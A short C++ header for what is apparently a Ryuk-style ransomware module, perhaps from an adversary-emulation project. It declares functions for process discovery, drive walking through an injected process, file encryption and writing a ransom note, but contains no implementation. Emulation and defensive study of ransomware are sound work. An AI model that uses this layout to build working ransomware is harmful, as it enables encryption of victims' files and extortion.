#ifndef RYUK_FILE_ENCRYPTION_H_
#define RYUK_FILE_ENCRYPTION_H_

#include <cstdio>
#include <map>
#include <stack>
#include <string>
#include <vector>

#include <tchar.h>
#include <windows.h>
#include <tlhelp32.h>
#include <processthreadsapi.h>

namespace ryuk {

    DWORD DiscoveryAndDirectoryWalk(TCHAR* processName);

    BOOL WalkDrive(DWORD dwInjectedProcessPID, std::wstring path, std::wstring mask, std::vector<std::wstring>* files, BOOL insert);

    INT EncryptionProcedure(const TCHAR* location);

    BOOL WriteRansomNote(std::wstring location);

} // namespace ryuk

#endif RYUK_FILE_ENCRYPTION_H_
